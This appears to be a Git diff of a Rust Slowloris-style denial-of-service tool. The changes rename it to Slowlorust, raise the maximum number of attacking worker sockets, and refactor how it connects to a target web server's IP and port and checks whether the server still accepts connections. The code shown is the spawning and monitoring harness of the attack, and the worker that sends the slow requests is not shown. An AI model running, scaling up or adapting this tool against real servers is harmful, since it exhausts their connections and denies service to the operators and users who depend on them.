@@ -13,14 +13,14 @@ use worker::Worker;
     version = "1.0",
     author = "Michael Van Leeuwen <michaeljvanleeuwen@gmail.com>"
 )]
-struct Slowdorust {
+struct Slowlorust {
     /// The IP address of the webserver
     ip: String,
     /// The port the webserver is running on
     port: String,
     /// How many worker sockets to open
     #[clap(short, long, default_value = "50")]
-    num_workers: u8,
+    num_workers: u16,
     /// Lower bound of request delay in seconds
     #[clap(short, long, default_value = "0")]
     lower_sleep: u8,
@@ -35,20 +35,21 @@ struct Slowdorust {
     verbose: i32,
 }
 
-fn benchmark_connection(ip: &String, port: &String) -> Result<Duration, Error> {
+fn benchmark_connection(conn_str: &str) -> Result<Duration, Error> {
     let now = Instant::now();
-    TcpStream::connect(format!("{}:{}", ip, port))?;
+    TcpStream::connect(&conn_str)?;
     Ok(now.elapsed())
 }
 
 fn main() {
-    let args = Slowdorust::parse();
+    let args = Slowlorust::parse();
 
     if args.lower_sleep >= args.upper_sleep {
         panic!("Error: sleep_min must be < sleep_max.")
     }
 
-    if benchmark_connection(&args.ip, &args.port).is_err() {
+    let conn_str = format!("{}:{}", args.ip, args.port);
+    if benchmark_connection(&conn_str).is_err() {
         panic!("Connection failed. Is the server up?");
     }
 
@@ -59,30 +60,29 @@ fn main() {
         while num_workers < args.num_workers {
             if let Ok(mut worker) = Worker::new(
                 num_workers,
-                &args.ip,
-                &args.port,
+                conn_str.clone(),
                 (args.lower_sleep, args.upper_sleep),
                 args.verbose,
             ) {
                 if args.verbose > 0 {
-                    println!("[slowloris_{:02}] Spawned.", num_workers);
+                    println!("[slowlorust_{:03}] Spawned.", num_workers);
                 }
                 scoped.execute(move || {
                     worker.start();
                 });
                 num_workers += 1;
-            }
-            if num_workers % (args.num_workers / 10 + 1) == 0 {
-                println!("\t{:02} workers spawned.", num_workers);
+                if num_workers % (args.num_workers / 10 + 1) == 0 {
+                    println!("\t{:03} workers spawned.", num_workers);
+                }
             }
         }
         println!("All workers spawned!");
 
         println!("Starting connection benchmarking...");
         loop {
-            match benchmark_connection(&args.ip, &args.port) {
+            match benchmark_connection(&conn_str) {
                 Ok(dur) => println!("\tConnected in {}s ({} ns).", dur.as_secs(), dur.as_nanos()),
-                Err(_) => println!("\tFailed to connect.")
+                Err(_) => println!("\tFailed to connect."),
             }
             sleep(Duration::from_secs(args.benchmark_delay as u64));
         }
